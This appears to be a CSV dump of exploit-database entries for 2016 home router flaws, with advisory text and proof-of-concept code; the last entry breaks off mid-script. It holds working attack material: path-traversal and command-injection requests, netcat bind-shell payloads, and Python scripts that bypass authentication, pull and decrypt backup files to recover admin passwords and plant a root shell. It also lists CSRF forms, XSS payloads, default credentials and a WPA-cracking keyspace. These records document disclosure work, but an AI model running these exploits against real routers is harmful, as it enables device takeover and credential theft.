2016-08-29,WebApps,CGI,Rahul Raz,PLC Wireless Router GPN2.4P21-C-CN,Arbitrary File Disclosure,"# Exploit Title: PLC Wireless Router GPN2.4P21-C-CN Authorised Arbitrary File Disclosure
# Date: 28/08/2016
# Exploit Author: Rahul Raz
# Affected Model : GPN2.4P21-C-CN(Frimware- W2001EN-00
#Vendor: ChinaMobile
# Tested on: Ubuntu Linux
#root:x:0:0:root:/root:/bin/bash
#root:x:0:0:root:/root:/bin/sh
#root:x:0:0:root:/root:/usr/bin/cmd
#tw:x:504:504::/home/tw:/bin/bash
#tw:x:504:504::/home/tw:/bin/msh","GET
/cgi-bin/webproc?getpage=../../../etc/passwd&var:language=en_us&var:menu=setup&var:page=connected
Host: 192.168.59.254
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101
Firefox/48.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: sessionid=64857d81
Connection: keep-alive
Response
HTTP/1.0 200 OK
Connection: close
Content-Type: text/html
Pragma: no-cache
Cache-Control: no-cache
Set-Cookie: sessionid=64857d81; expires=Fri, 31-Dec-9999 23:59:59 GMT;
path=/"
2016-07-25,WebApps,Hardware,Gergely Eberhardt,Compal CH7465LG-LC Modem/Router CH7465LG-NCIP-4.50.18.13-NOSH,Multiple Vulnerabilities,,"Compal CH7465LG-LC modem/router multiple vulnerabilities
The following vulnerabilities are the result of a quick check (~3 hours)
of the Mercury modem. We performed a systematic and deeper evaluation of
this device also, which result will be described in a separate report [2] and advisory.
Platforms / Firmware confirmed affected:
- Compal CH7465LG-LC, CH7465LG-NCIP-4.50.18.13-NOSH
Vulnerabilities
Insecure session management
The web interface uses cookies, but is not verified. Thus, if admin
login is successful, the IP address and the browser type of the admin
user are stored and everybody can access the management interface with
the same IP and the same user-agent.
Information leakage
Some information requests can be performed without authentication. For
example an attacker can obtain the following information pieces:
-    Global settings (SW version, vendor name, etc.)
-    CSRF token
-    Event log
-    LAN user table
-    Ping response
Unauthenticated deny of service attack
Factory reset can be initiated without authentication with a simple POST
request to the getter.xml.
Unauthenticated configuration changes
Some settings modification can be performed without authentication, for
example the first install flag and the ping command.
Unauthenticated command injection
The ping diagnostic function is vulnerable to system command injection,
because parameters are checked only at the client side. Using the
following ping target, the attacker can gain local root access to the
device:
“token=<csrf_token>&fun=126&Type=0&Target_IP=127.0.0.1&Ping_Size=64;nc
-l -p 1337 -e /bin/sh;&Num_Ping=3&Ping_Interval=1”
Timeline
- 2015.10.21: SEARCH-LAB received two sample boxes from the Compal Mercury devices from UPC Magyarorszag
- 2015.10.21: Within three hours we reported a remotely exploitable vulnerability on the device
- 2015.10.21: Liberty Global asked for a commercial proposal on executing an overall security evaluation of the Compal device.
- 2015.10.24: A proposal was sent to Liberty Global.
- 2015.11.09: Liberty Global asked to execute the evaluation as a pilot project without financial compensation.
- 2015.12.07: End Use Certificate for Dual-Use Items was asked from Liberty Global as the developer of the device is located in China.
- 2016.01.07: The 99-page-long Evaluation Report on Compal Mercury modem was sent to Liberty Global with the restriction that they are not allowed to forward it outside of the European Union until a signed End Use Certificate is received.
- 2016.01.07: First reaction to the report said: “Bloody hell, that is not a small document ;)”
- 2016.01.11: Liberty Global sent the signed End Use Certificate for Dual-Use Items to SEARCH-LAB
- 2016.01.27: UPC Magyarorszag send out a repeated warning to its end users about the importance of the change of the default passphrases.
- 2016.02.16: Face to face meeting with Liberty Global security personnel in Amsterdam headquarters
- 2016.02.18: A proposal was sent to Liberty Global suggesting a wardriving experiment in Budapest, Hungary to measure the rate of end users who are still using the default passphrases.
Recommendations
We do not know about any possible solution. Firmware update should install the ISP after the fix will be ready.
Credits
This vulnerability was discovered and researched by Gergely Eberhardt from SEARCH-LAB Ltd. (www.search-lab.hu)
References
[1] http://www.search-lab.hu/advisories/secadv-20160720
[2] http://www.search-lab.hu/media/Compal_CH7465LG_Evaluation_Report_1.1.pdf"
2016-07-25,WebApps,Hardware,Gergely Eberhardt,Hitron CGNV4 Modem/Router 4.3.9.9-SIP-UPC,Multiple Vulnerabilities,,"Hitron CGNV4 modem/router multiple vulnerabilities
Platforms / Firmware confirmed affected:
- Hitron CGNV4, 4.3.9.9-SIP-UPC
- Product page: http://www.hitrontech.com/en/cable_detail.php?id=62
Vulnerabilities
Insecure session management
The web interface uses insecure cookies, which can be brute-forced
easily (e.g cookie: userid=0). If admin login is successful, the IP
address of the admin user is stored and everybody can access the
management interface with the same IP.
Missing CSRF protection
The web interface is not used any CSRF protection. In case of a valid
session exists, the attacker can modify any settings of the router. If
the default admin password was not changed, the attacker can perform a
login also and modify any settings after it.
Authenticated command injection
The ping diagnostic function is vulnerable to system command injection,
because the parameters are checked only at the client side. Using the
following ping target, the attacker can gain local root access to the
device:
“google.com;nc -l -p 1337 -e /bin/sh;echo”.
Disclaimer
We found these vulnerabilities within a very short time range (3 hours),
and we did not check a lot of areas such as:
- Command injections in other modules
- Buffer overflows
- User authentication
- Default SSID and passphrase
- Analysis of the backup file
- Device configuration (such as SNMP)
Timeline
- 2015.10.16: Vulnerabilities found in the Hitron CGNV4 were reported to UPC Magyarorszag and Liberty Global
- 2016.01.27: UPC Magyarorszag send out a repeated warning to its end users about the importance of the change of the default passphrases.
- 2016.02.16: Face to face meeting with Liberty Global security personnel in Amsterdam headquarters
- 2016.02.18: A proposal was sent to Liberty Global suggesting a wardriving experiment in Budapest, Hungary to measure the rate of end users who are still using the default passphrases.
Recommendations
We do not know about any possible solution. Firmware update should
install the ISP after the fix will be ready.
Credits
This vulnerability was discovered and researched by Gergely Eberhardt
from SEARCH-LAB Ltd. (www.search-lab.hu)
References
[1] http://www.search-lab.hu/advisories/secadv-20160720"
2016-07-25,WebApps,CGI,Gergely Eberhardt,Technicolor TC7200 Modem/Router STD6.02.11,Multiple Vulnerabilities,"# POC code for Technicolor TC7200
# Demonstrates the following vulnerabilities
#  - Unauthenticated backup file access
#  - Backup file decryption
# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
# Advisory: http://www.search-lab.hu/advisories/secadv-20150720
# create technicolor object","Technicolor TC7200 modem/router multiple vulnerabilities
Platforms / Firmware confirmed affected:
- Technicolor TC7200, STD6.02.11
- Product page: http://www.technicolor.com/en/solutions-services/connected-home/broadband-devices/cable-modems-gateways/tc7200-tc7300
Vulnerabilities
Insecure session management
The web interface does not use cookies at all and does not check the IP
address of the client. If admin login is successful, every user from the
LAN can access the management interface.
Backup file encryption uses fix password
Technicolor fixed the CVE-2014-1677 by encrypting the backup file with
AES. However, the encrypted backup file remains accessible without
authentication and if the password is not set in the web interface a
default password is used. So, if an attacker accesses the backup file
without authentication, the password cannot be set, and the backup file
can be decrypted.
Timeline
- 2015.07.30: We sent some new issues affecting the Ubee router and other findings in Technicolor TC7200 and Cisco EPC3925 devices to UPC
- Between 2015.07.31 and 08.12 there were several e-mail and phone communications between technical persons from Liberty Global to clarify the findings
- 2015.08.19: UPC sent out advisory emails to its end users to change the default WiFi passphrase
- 2016.01.27: UPC Magyarorszag send out a repeated warning to its end users about the importance of the change of the default passphrases.
- 2016.02.16: Face to face meeting with Liberty Global security personnel in Amsterdam headquarters
- 2016.02.18: A proposal was sent to Liberty Global suggesting a wardriving experiment in Budapest, Hungary to measure the rate of end users who are still using the default passphrases.
POC
POC script is available to demonstrate the following problems [2]:
- Unauthenticated backup file access
- Backup file decryption
Recommendations
Since only the ISP can update the firmware, we can recommend for users
to change the WiFi passphrase.
Credits
This vulnerability was discovered and researched by Gergely Eberhardt
from SEARCH-LAB Ltd. (www.search-lab.hu)
References
[1] http://www.search-lab.hu/advisories/secadv-20160720
[2] https://github.com/ebux/Cable-modems/tree/master/Technicolor
import sys
import requests
import struct
import binascii
from Crypto.Cipher import AES
class technicolor:
def __init__(self, addr, port):
self.addr = addr
self.port = port
self.s = requests.Session()
def getUri(self, uri):
return 'http://%s:%d/%s'%(self.addr,self.port,uri)
def downloadBackupFile(self):
r = self.s.get(self.getUri('goform/system/GatewaySettings.bin'))
resp = ''
for chunk in r:
resp += chunk
return resp
def parseBackup(self, backup):
p = backup.find('MLog')
if (p > 0):
p += 6
nh = struct.unpack('!H',backup[p:p+2])[0]
name = backup[p+2:p+2+nh]
p += 2+nh
ph = struct.unpack('!H',backup[p:p+2])[0]
pwd = backup[p+2:p+2+nh]
return (name,pwd)
return ('','')
def decryptBackup(self, backup):
key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')
l = (len(backup)/16)*16
cipher = AES.new(key, AES.MODE_ECB, '\x00'*(16))
plain = cipher.decrypt(backup[0:l])
return plain
if (len(sys.argv) < 2):
print 'technicolor_tc7200_poc.py addr [port]'
addr = sys.argv[1]
port = 80
if (len(sys.argv) == 3):
port = int(sys.argv[2])
t = technicolor(addr, port)
backup = t.downloadBackupFile()
if (len(backup) > 0):
open('test.enc', 'wb').write(backup)
plain = t.decryptBackup(backup)
open('test.dec', 'wb').write(plain)
(name, pwd) = t.parseBackup(plain)
if (name != ''):
print 'admin name: %s, pwd: %s'%(name,pwd)"
2016-07-25,WebApps,CGI,Gergely Eberhardt,Ubee EVW3226 Modem/Router 1.0.20,Multiple Vulnerabilities,"http://<device_ip>/cgi-bin/setup.cgi?gonext=../www/main2
http://<device_ip>/Configuration_file.cfg
http://<device_ip>/cgi-bin/setup.cgi?factoryBypass=1
http://192.168.0.1/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaConfiguration_file.cfg
# POC code for Ubee EVW3226
# Demonstrates the following vulnerabilities
#  - Authentication bypass
#  - Unauthenticated backup file access
#  - Backup file password disclosure
#  - Code execution
# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)
# Advisory: http://www.search-lab.hu/advisories/secadv-20150720
# get validcode (CSRF token)
# create backup file
# get validcode (CSRF token)
# restore config file
# create ubee object
# perform authentication bypass
# download backup file if it is exists (auth is not required)
# create and download backup file (auth required)
# parse downloaded file and get admin and backup file password
# execute shell command in the router","Ubee EVW3226 modem/router multiple vulnerabilities
Platforms / Firmware confirmed affected:
- Ubee EVW3226, 1.0.20
- Product page: http://www.ubeeinteractive.com/products/cable/evw3226
Vulnerabilities
Insecure session management
The web interface does not use cookies at all. If admin login is
successful, the IP address of the admin user is stored and everybody can
access the management interface with the same IP.
Local file inclusion
Setup.cgi can read any file with .htm extension using directory
traversal in the gonext parameter. Although the file must have htm
extension, the local file inclusion can be used to map directories,
because the response is different depending on whether directory exists
or not.
POC:
Backup file is not encrypted
Although the web interface requires a password for encrypting the backup
file, the encryption is not performed. In order to backup file password,
the plain password is stored in the backup file, which is a standard tgz
(gzipped tar) file with a simple header.
Backup file disclosure
When a user requests a backup file, the file is copied into www root in
order to make download possible. However, the backup file is not removed
from the www root after download. Since there is not any session check
required to download the backup file, an attacker is able to download it
without authentication from LAN until the next reboot.
Since the backup file is not encrypted and contains the plain admin
password, the router can be compromised from LAN.
POC:
Authentication bypass (backdoor)
The web interface bypasses authentication if the HTML request contains
the factoryBypass parameter. In this case a valid session is created and
the attacker can gain full control over the device.
POC:
Arbitrary code execution
The configuration file restore function receives a compressed tar file,
which is extracted to the /tmp folder. Tar files may contain symbolic
links, which can link out from the extraction folder. By creating a
configuration file with a symbolic link and a folder which uses this
link, the attacker can write out from the backup folder and can
overwrite any file in the writable file-system.
Since www is copied to the writable file system at boot time (under
/tmp), the attacker can insert a new cgi script that executes arbitrary
code with root privileges.
Default SSID and passphrase can be calculated
The default SSID and passphrase are derived only from the MAC address.
Since the MAC address of the device is broadcasted via WiFi, the default
password can be calculated easily.
Combined with code execution and factory bypass, even a botnet of Ubee
routers can be deployed easily.
Buffer overflow in configuration restore
During the configuration restore process, the backup file password is
read from the pass.txt file. If the password is large enough (larger
than 65536), a stack based buffer overflow is caused, because the file
content is loaded with fscanf(“%s”) to a stack based local variable. The
stack based buffer overflow can be used to execute arbitrary code with
root privileges.
Buffer overflow in configuration file request
The web interface identifies the configuration file download request by
checking that the URL contains the Configuration_file.cfg string. If
this string is found, the whole URL is copied into a stack based buffer,
which can cause a buffer overflow. This stack based buffer overflow can
be used to execute arbitrary code with root privileges without
authentication.
POC:
Buffer overflow in next file name
The gonext variable in the POST requests specifies the HTML file, which
the cgi script should be loaded. If the gonext variable is large enough
(larger than 6512 bytes), a stack based buffer overflow is caused, which
can be used to execute arbitrary code with root privileges without
authentication.
Communication on the UPC Wi-Free can be sniffed within the device
The UPC Wi-Free communication is not separated correctly inside the
device, because the whole communication can be sniffed after gaining
root access to the device.
Timeline
- 2015.06.24: Presenting the Ubee router problems to the CTO of UPC Magyarorszag
- 2015.07.16: UPC contacted Ubee and required some more proof about some specific problems
- 2015.07.16: Proofs, that the default passphrase calculation of the Ubee router was broken, were sent to UPC
- 2015.07.20: UPC requested the POC code
- 2015.07.21: POC code was sent to UPC
- 2015.07.30: We sent some new issues affecting the Ubee router and other findings in Technicolor TC7200 and Cisco EPC3925 devices to UPC
- Between 2015.07.31 and 08.12 there were several e-mail and phone communications between technical persons from Liberty Global to clarify the findings
- 2015.08.19: UPC sent out advisory emails to its end users to change the default WiFi passphrase
- 2015.09.16: Ubee Interactive also asked some questions about the vulnerabilities
- 2015.09.24: We sent detailed answers to Ubee Interactive
- 2016.01.27: UPC Magyarorszag send out a repeated warning to its end users about the importance of the change of the default passphrases.
- 2016.02.16: Face to face meeting with Liberty Global security personnel in Amsterdam headquarters
- 2016.02.18: A proposal was sent to Liberty Global suggesting a wardriving experiment in Budapest, Hungary to measure the rate of end users who are still using the default passphrases.
POC
POC script is available to demonstrate the following problems [3]:
- Authentication bypass
- Unauthenticated backup file access
- Backup file password disclosure
- Code execution
Video demonstration is also available [1], which presents the above problems and how these can be combined to obtain full access to the modem.
Recommendations
Since only the ISP can update the firmware, we can recommend for users to change the WiFi passphrase.
Credits
This vulnerability was discovered and researched by Gergely Eberhardt from SEARCH-LAB Ltd. (www.search-lab.hu)
References
[1] http://www.search-lab.hu/advisories/secadv-20160720
[2] https://youtu.be/cBclw7uUuO4
[3] https://github.com/ebux/Cable-modems/tree/master/Ubee
import sys
import requests
import tarfile
import struct
import binascii
import re
import shutil
config_data = binascii.unhexlify('00003226FFA486BE000001151F8B0808EB7D4D570400706F635F636F6E666967'
'2E74617200EDD53D4FC3301006E09BF32BDC30A78E9D3816AC8811898185D104'
'8B4404C7CA1DA4FC7B121A900A0296A66A153FCBF96BB15F9D8C0DCC2E1D68AD'
'87FA61A7EE8E65AEB48254C86C38CE247F351DA767CFFBBEE7308F1724D33106'
'5DDBD21FC7FEDD3F51DE20AE6933EBD5C6648B3CFF3D7F21BEE52F649E014BE1'
'00169EFFD5F5CDED9DC88A730896081B5E3ED6C97DED3859A43556B077DBF667'
'3FD6BFDA5F291052CB4CEA421502C6DF221707EEFF853A5BF1317BAC225B562D'
'BB6C1D594709BD797BC1C86E88FBC6D46EBB1BC753AD4CF9641F1836AB389A96'
'3C8A38F2F83975968687A5389A062C712682200882E058BC0383AF448C000E0000')
class ubee:
def __init__(self, addr, port):
self.addr = addr
self.port = port
self.s = requests.Session()
def getUri(self, uri):
return 'http://%s:%d/%s'%(self.addr,self.port,uri)
def authenticationBypass(self):
self.s.get(self.getUri('cgi-bin/setup.cgi?factoryBypass=1'))
self.s.get(self.getUri('cgi-bin/setup.cgi?gonext=main2'))
def parseNVRam(self, nv):
o = 0x1c
pos = 2
nvdata = {}
while(True):
stype = struct.unpack('!H', nv[o:o+2])[0]
slen = struct.unpack('!H', nv[o+2:o+4])[0]
sval = nv[o+4:o+4+slen]
nvdata[stype] = sval
pos += slen
o = o+slen+4
if (o >= len(nv) ):
break
return nvdata
def parseBackupFile(self, fname):
tar = tarfile.open(""Configuration_file.cfg"", ""r:gz"")
for tarinfo in tar:
if tarinfo.isreg():
if (tarinfo.name == 'pass.txt'):
print 'config file password: %s'%(tar.extractfile(tarinfo).read())
elif (tarinfo.name == '1'):
nvdata = self.parseNVRam(tar.extractfile(tarinfo).read())
print 'admin password: %s'%(nvdata[3])
tar.close()
def saveBackup(self, r, fname):
if r.status_code == 200:
resp = ''
for chunk in r:
resp += chunk
open(fname, 'wb').write(resp[0xc:])
def createBackupFile(self, fname):
r = self.s.get(self.getUri('cgi-bin/setup.cgi?gonext=RgSystemBackupAndRecoveryBackup'))
m = re.search('ValidCode = ""([^""]+)""', r.text)
if (m == None):
print 'ValidCode is not found'
return
validCode = m.group(1)
r = self.s.get(self.getUri('cgi-bin/setup.cgi?gonext=Configuration_file.cfg&Password=secretpass&ValidCode=%s')%(validCode))
if (len(r.text) > 0):
self.saveBackup(r, fname)
def downloadBackupFile(self, fname):
r = self.s.get(self.getUri('Configuration_file.cfg'))
if (len(r.text) > 0):
print len(r.text)
self.saveBackup(r, fname)
return True
return False
def restoreConfigFile(self, fname = '', passwd = 'badpasswd'):
r = self.s.get(self.getUri('cgi-bin/setup.cgi?gonext=RgSystemBackupAndRecoveryRestore'))
m = re.search('name=""ValidCode"" value=""([^""]+)""', r.text)
if (m == None):
print 'ValidCode is not found'
return
validCode = m.group(1)
if (fname == ''):
cfg_data = config_data
else:
cfg_data = open(fname, 'rb').read()
r = self.s.post(self.getUri('cgi-bin/restore.cgi'), files=(('ValidCode', (None, validCode)), ('PasswordStr', (None, passwd)), ('browse', cfg_data), ('file_name', (None, 'Configuration_file.cfg'))))
if (r.text.find('alert(""Password Failure!"")') > 0):
return True
else:
return False
def getShellResponse(self):
r = self.s.get(self.getUri('cgi-bin/test.sh'))
print r.text
if (len(sys.argv) < 2):
print 'ubee_evw3226_poc.py addr [port]'
addr = sys.argv[1]
port = 80
if (len(sys.argv) == 3):
port = int(sys.argv[2])
u = ubee(addr, port)
u.authenticationBypass()
if (not u.downloadBackupFile('Configuration_file.cfg')):
u.createBackupFile('Configuration_file.cfg')
u.parseBackupFile('Configuration_file.cfg')
if (u.restoreConfigFile()):
print 'Shell installed'
u.getShellResponse()
else:
print 'Shell install failed'"
2016-07-11,WebApps,CGI,Gregory Smiley,Belkin AC1200 Router Firmware 1.00.27,Authentication Bypass,"# Exploit Title: Belkin Router AC1200, Firmware: 1.00.27 - Authentication Bypass
# Date: 5/11/2016
# Exploit Author: Gregory Smiley
# Contact: gsx0r.sec@gmail.com
# Vendor Homepage: http://www.belkin.com
# Version: Firmware: 1.00.27
# Tested on:F9K1113 v1
#1. Description:
#The Belkin AC1200 is vulnerable to authentication bypass due to it performing client side
#authentication after you attempt to login after already having failed a login. That webpage, loginpserr.stm contains the md5 hash value of the administrators password. This can be
#exploited by extracting that hash value, and passing it in the pws field in a post request to
#login.cgi.
#I would like to note that I contacted Belkin on several occasions
#and gave them plenty of time to reply/fix the issue before releasing this entry.
#2. Proof:
#Line 55 of loginpserr.stm contains the javascript code:
#var password = ""md5hashofpassword"";
#3. Exploit:
#!/usr/bin/python
#Assemble the POST request to /login.cgi
#Sends the POST request with the hash in the pws field","import urllib
import urllib2
import sys
router = raw_input('Enter IP address of your AC1200 to test: ')
page = urllib2.urlopen('http://'+router+'/loginpserr.stm').read()
test_page = page
vuln_string = 'var password = ""'
if vuln_string in test_page:
print 'Router is vulnerable.'
answer = raw_input('Would you like to exploit the target? Y/N : ')
else:
print 'Router is not vulnerable.'
print 'exiting...'
sys.exit()
if (answer == 'y') or (answer == 'Y'):
extract = test_page.split(vuln_string, 1)[1] #These two lines extract the leaked hash value
_hash = extract.partition('""')[0] #from /loginpserr.stm using quotes as a delimiter
else:
if (answer == 'n') or (answer == 'N'):
print 'exiting...'
sys.exit()
headers = {
'Host': router,
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0',
'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language' : 'en-US,en;q=0.5',
'Accept-Encoding' : 'gzip, deflate',
'Referer' : 'http://'+router+'/',
'Connection': 'keep-alive',
'Content-Type': 'application/x-www-form-urlencoded'
data = {
'totalMSec':'0',
'pws': _hash,
'url':'status.stm',
'arc_action':'login',
'pws_temp': ''
data = urllib.urlencode(data)
req = urllib2.Request('http://'+router+'/login.cgi', data, headers)
response = urllib2.urlopen(req)
the_page = response.read()
print 'Exploit successful.'
print 'You are now free to navigate to http://'+router+'/ ...as admin ;)'"
2016-06-27,DoS,Hardware,Matt O'Connor,Magnet Networks Tesley CPVA 642 Router,Weak WPA-PSK Passphrase Algorithm,"# Exploit Title: Magnet Networks – Weak WPA-PSK passphrases used in Tesley CPVA 642 Router
# Google Dork:
# Date: 01/06/2016
# Author: Matt O'Connor
# Advisory Link:  https://www.rgb.ie/magnet-broadband-weak-wpa-psk-algorithm.pdf
# Version:
# Category: Remote
# Tested on: Magnet Networks Tesley CPVA 642","The Tesley CPVA 642 routers supplied by Magnet Networks are vulnerable to an offline dictionary attack if the WPA-PSK handshake is obtained by an attacker.
The WPA-PSK pass phrase has the following features:
• Starts with MAGNET0
• Adds six random numerical digits
• 1 million possible combinations ( MAGNET0000000 – MAGNET0999999 )
The entire keyspace can be generated using “mask processor” by ATOM, piping each letter out to its own file, for example:
./mp32 MAGNET0?1?1?1?1?1?1 > magnet_networks_tesley_ks.txt
The .txt file weighs in at around 45mb.
Using a 1.4ghz i3 processor on a budget laptop, we were hitting 1,000 keys per second.  Breakdown below:
• 1,000,000 / 1,000 keys per second = 1,000 seconds
• 1,000 / 60 seconds = 16~ minutes
The WPA-PSK handshake we used has the password MAGNET0349325 and was cracked within ~6 minutes.
If you’re using the default password on your Magnet Networks Tesley CPVA 642 Router, we recommend changing it immediately to a more secure password, using a mix of letters, numbers and symbols.
On the 20th of June 2016, Magnet Networks Customer Care confirmed via email that these routers are not used by Magnet Networks anymore."
2016-06-15,WebApps,Hardware,LiquidWorm,Hyperoptic (Tilgin) Router HG23xx,Multiple Vulnerabilities,"http://www.tilgin.com
Summary: Tilgin's HG23xx family of products offers a flexible and
Desc: The application allows users to perform certain actions via HTTP","Hyperoptic (Tilgin) Router HG23xx Multiple XSS And CSRF Vulnerabilities
Vendor: Hyperoptic Ltd. | Tilgin AB
Product web page: http://www.hyperoptic.com
Affected version: HG2330, HG2302 and HG2301
high capacity product in a tiny form factor. When having the product
in your hands, do not get fooled by its mere size. The product offers
full gigabit routing and a state of the art superior WLAN solution.
It runs all services offered with Tilgin HGA and is prepared for all
foreseeable future services. The product is also offered in an entry
level version with fast Ethernet LAN ports, still with gigabit Ethernet
WAN. The routing capacity and excellent WLAN remains the same also on
this model, the only limit being the fast Ethernet LAN ports.
requests without performing any validity checks to verify the requests.
This can be exploited to perform certain actions with administrative
privileges if a logged-in user visits a malicious web site. XSS issues
were also discovered. The issue is triggered when input passed via multiple
POST and GET parameters are not properly sanitized before being returned
to the user. This can be exploited to execute arbitrary HTML and script
code in a user's browser session in context of an affected site.
Tested on: lighttpd/1.4.26-devel-166445
lighttpd/1.4.26-devel-163573
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2016-5329
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5329.php
11.05.2016
Default credentials:
user/user
admin/admin
admin/abcd2301
XSS PoC:
POST /advanced/firewall_templates/ HTTP/1.1
Host: 192.168.1.1
__form=new&name=test""><script>prompt(1)</script>
Response:
[..snip..]
<INPUT type=""hidden"" name=""name"" value=""test""><script>prompt(1)</script>"">
[..snip..]
CSRF Add Storage (HTTP/SMB) User:
<html>
<body>
<form action=""http://192.168.1.1/storage/users/"" method=""POST"">
<input type=""hidden"" name=""&#95;&#95;form"" value=""new"" />
<input type=""hidden"" name=""name"" value=""testuser"" />
<input type=""hidden"" name=""password"" value=""testpass"" />
<input type=""submit"" value=""Submit"" />
</form>
</body>
</html>
CSRF Change Admin Password:
<html>
<body>
<form action=""http://192.168.1.1/tools/admin_account/"" method=""POST"">
<input type=""hidden"" name=""&#95;&#95;form"" value=""user"" />
<input type=""hidden"" name=""name"" value=""admin"" />
<input type=""hidden"" name=""password"" value=""NEWPASS"" />
<input type=""submit"" value=""Submit"" />
</form>
</body>
</html>"
2016-05-04,WebApps,CGI,Bhadresh Patel,NetCommWireless HSPA 3G10WVE Wireless Router,Multiple Vulnerabilities,,"Title:
NetCommWireless HSPA 3G10WVE Wireless Router – Multiple vulnerabilities
Credit:
Name: Bhadresh Patel
Company/affiliation: HelpAG
Website: www.helpag.com
CVE:
CVE-2015-6023, CVE-2015-6024
Date:
03-05-2016 (dd/mm/yyyy)
Vendor:
NetComm Wireless is a leading developer and supplier of high performance
communication devices that connect businesses and people to the internet.
Products and services:
Wireless 3G/4G broadband devices
Custom engineered technologies
Broadband communication devices
Customers:
Telecommunications carriers
Internet Service Providers
System Integrators
Channel partners
Enterprise customers
Product:
HSPA 3G10WVE is a wireless router
It integrates a wireless LAN, HSPA module and voice gateway into one
stylish unit. Insert an active HSPA SIM Card into the slot on the rear
panel & get instant access to 3G internet connection. Etisalat HSPA
3G10WVE wireless router incorporates a WLAN 802.11b/g access point, two
Ethernet 10/100Mbps ports for voice & fax. Featuring voice port which
means that one can stay connected using the internet & phone. If one
need a flexible internet connection for his business or at home; this is
the perfect solution.
Customer Product link: http://www.etisalat.ae/nrd/en/generic/3.5g_router.jsp
Abstract:
Multiple vulnerabilities in the HSPA 3G10WVE wireless router enable an
anonymous unauthorized attacker to 1) bypass authentication and gain
unauthorized access of router's network troubleshooting page (ping.cgi)
and 2) exploit a command injection vulnerability on ping.cgi, which
could result in a complete system/network compromise.
Report-Timeline:
03-09-2015: Vendor notification
08-09-2015: Vendor Response/Feedback
02-05-2016: Vendor Fix/Patch
03-05-2016: Public Disclosure
Affected Software Version:
3G10WVE-L101-S306ETS-C01_R03
Exploitation-Technique:
Remote
Severity Rating (CVSS):
10.0 (Critical) (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
Details:
Below listed vulnerabilities enable an anonymous unauthorized attacker
to gain access of network troubleshooting page (ping.cgi) on wireless
router and inject commands to compromise full system/network.
1) Bypass authentication and gain unauthorized access vulnerability -
CVE-2015-6023
2) Command injection vulnerability - CVE-2016-6024
Vulnerable module/page/application: ping.cgi
Vulnerable parameter: DIA_IPADDRESS
Proof Of Concept:
PoC URL:
http(s)://<victim_IP>/ping.cgi?DIA_IPADDRESS=4.2.2.2;cat%20/etc/passwd
PoC Video: https://www.youtube.com/watch?v=FS43MRG7RDk
Patched/Fixed Firmware and notes:
ftp://files.planetnetcomm.com/3G10WVE/3G10WVE-L101-S306ETS-C01_R05.bin
NOTE: Verified only by Vendor
Credits:
Bhadresh Patel
Senior Security Analyst
HelpAG (www.helpag.com)"
2016-04-27,WebApps,Hardware,Milad Doorbash,RomPager 4.34 (Multiple Router Vendors),'Misfortune Cookie' Authentication Bypass,"# Title: Misfortune Cookie Exploit (RomPager <= 4.34) router authentication remover
# Date: 17/4/2016
# CVE: CVE-2015-9222 (http://mis.fortunecook.ie)
# Vendors: ZyXEL,TP-Link,D-Link,Nilox,Billion,ZTE,AirLive,...
# Vulnerable models: http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf
# Versions affected: RomPager <= 4.34 (specifically 4.07)
# Tested on : firmwares which are set as tested in the targets list
# Category: Remote Exploit
# Usage: ./exploit.py url
#Example: python exploit.py http://192.168.1.1 , python exploit.py https://192.168.1.1:3040
# Author: Milad Doorbash
# Email: milad.doorbash@gmail.com
# Social: @doorbash
# Blog: http://doorbash.ir
# Many Thanks to :
# Cawan Chui (http://embedsec.systems/embedded-device-security/2015/02/16/Misfortune-Cookie-CVE-2014-9222-Demystified.html)
#Piotr Bania (http://piotrbania.com/all/articles/tplink_patch)
#Grant Willcox (https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/10/porting-the-misfortune-cookie-exploit-whitepaperpdf)
# Chan (http://scz.617.cn/misc/201504141114.txt -- http://www.nsfocus.com.cn/upload/contents/2015/09/2015_09181715274142.pdf)
# Disclaimer :
#This exploit is for testing and educational purposes only.Any other usage for this code is not allowed.
#Author takes no responsibility for any actions with provided informations or codes.
# Description :
# Misfortune Cookie is a critical vulnerability that allows an intruder to remotely
# take over an Internet router and use it to attack home and business networks.With a few magic
#cookies added to your request you bypass any authentication and browse the configuration
#interface as admin, from any open port.
# *---------- means data for this firmware is obtained from other tested firmwares.
# if you tested on your devices report to me so i can change them to tested state.
# don't forget to mention your device model and full firmware version in your reports.
# I could not gather information for every vulnerable firmwares since some vendors has removed
# vulnerable/old ones from their websites or add some unknown-yet security mechanisms to the them.
# if you want to add missing firmwares data to list you can do it by reading blog posts
# mentioned in ""Many thanks to"" part at the beginning.Btw please don't hesitate to contact me
# for any question or further information.","import requests
import sys
import time
MODE_TEST = 100000
MODE_BRUTE_FORCE = 100001
if len(sys.argv) == 1:
print ""usage: python "" + sys.argv[0] + "" url [enable]""
print ""example: python exploit.py http://192.168.1.1 , python exploit.py https://192.168.1.1:3040""
exit()
url = str(sys.argv[1])
auth_byte = '\x00'
s = requests.Session()
if len(sys.argv) == 3:
if str(sys.argv[2]) == 'enable':
auth_byte = '\x01' # enable authenticaion again
else:
